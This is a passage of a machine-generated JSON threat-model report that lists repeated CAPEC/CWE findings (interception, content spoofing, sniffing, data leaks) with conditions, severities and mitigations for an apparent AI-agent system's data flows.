cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Model inference response", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "352", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Model inference response", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "353", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Model inference response", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "354", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Model inference response", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "355", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Dispatch session to agent runtime", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "356", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Dispatch session to agent runtime", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "357", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Dispatch session to agent runtime", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "358", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Dispatch session to agent runtime", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "359", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Dispatch session to agent runtime", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "360", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Dispatch session to agent runtime", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "361", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Dispatch session to agent runtime", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "362", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Agent output + tool results", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "363", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Agent output + tool results", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "364", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Agent output + tool results", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "365", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Agent output + tool results", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "366", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Agent output + tool results", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "367", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Agent output + tool results", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "368", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Agent output + tool results", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "369", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Read/write configuration", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "370", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Read/write configuration", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "371", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Read/write configuration", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "372", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Read/write configuration", "threat_id": "CR06"}, {"assumption": null, "condition": "not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Client-Server Protocol Manipulation", "details": "An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.", "example": "An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.", "id": "373", "mitigations": "Use strong authentication protocols.", "references": "https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html", "response": "", "severity": "Medium", "target": "Read/write configuration", "threat_id": "CR08"}, {"assumption": null, "condition": "target.hasDataLeaks()", "cvss": "", "description": "Data Leak", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "An application, which connects to a database without TLS, performs a database query in which it compares the password to a stored hash, instead of fetching the hash and comparing it locally.", "id": "374", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "Very High", "target": "Read/write configuration", "threat_id": "DS06"}, {"assumption": null, "condition": "(target.hasDataLeaks() or any(d.isCredentials or d.isPII for d in target.data)) and (not target.controls.isEncrypted or (not target.isResponse and any(d.isStored and d.isDestEncryptedAtRest for d in target.data)) or (target.isResponse and any(d.isStored and d.isSourceEncryptedAtRest for d in target.data)))", "cvss": "", "description": "Unprotected Sensitive Data", "details": "An attacker can access data in transit or at rest that is not sufficiently protected. If an attacker can decrypt a stored password, it might be used to authenticate against different services.", "example": "", "id": "375", "mitigations": "All data should be encrypted in transit. All PII and restricted data must be encrypted at rest. If a service is storing credentials used to authenticate users or incoming connections, it must only store hashes of them created using cryptographic functions, so it is only possible to compare them against user input, without fully decoding them. If a client is storing credentials in either files or other data store, access to them must be as restrictive as possible, including using proper file permissions, database users with restricted access or separate storage.", "references": "https://cwe.mitre.org/data/definitions/311.html, https://cwe.mitre.org/data/definitions/312.html, https://cwe.mitre.org/data/definitions/916.html, https://cwe.mitre.org/data/definitions/653.html", "response": "", "severity": "High", "target": "Read/write configuration", "threat_id": "DR01"}, {"assumption": null, "condition": "not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion", "cvss": "", "description": "Interception", "details": "An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.", "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.", "id": "376", "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.", "references": "https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Read/write credentials", "threat_id": "DE01"}, {"assumption": null, "condition": "((not target.source.controls.providesIntegrity or not target.sink.controls.providesIntegrity) and not target.controls.isEncrypted) or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation))", "cvss": "", "description": "Content Spoofing", "details": "An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.", "example": "An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker's server.", "id": "377", "mitigations": "Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.", "references": "https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html", "response": "", "severity": "Medium", "target": "Read/write credentials", "threat_id": "AC05"}, {"assumption": null, "condition": "(target.protocol == 'HTTP' or target.controls.isEncrypted is False) or target.usesVPN is False", "cvss": "", "description": "Sniffing Attacks", "details": "In this attack pattern, the adversary intercepts information transmitted between two third parties. The adversary must be able to observe, read, and/or hear the communication traffic, but not necessarily block the communication or change its content. The adversary may precipitate or indirectly influence the content of the observed transaction, but is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the adversary can examine the contents between the sender and recipient.", "example": "Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.", "id": "378", "mitigations": "Encrypt sensitive information when transmitted on insecure mediums to prevent interception.", "references": "https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html", "response": "", "severity": "Medium", "target": "Read/write credentials", "threat_id": "DE03"}, {"assumption": null, "condition": "(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Communication Channel Manipulation", "details": "An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.", "example": "Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.", "id": "379", "mitigations": "Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.", "references": "https://capec.mitre.org/data/definitions/216.html", "response": "", "severity": "High", "target": "Read/write credentials", "threat_id": 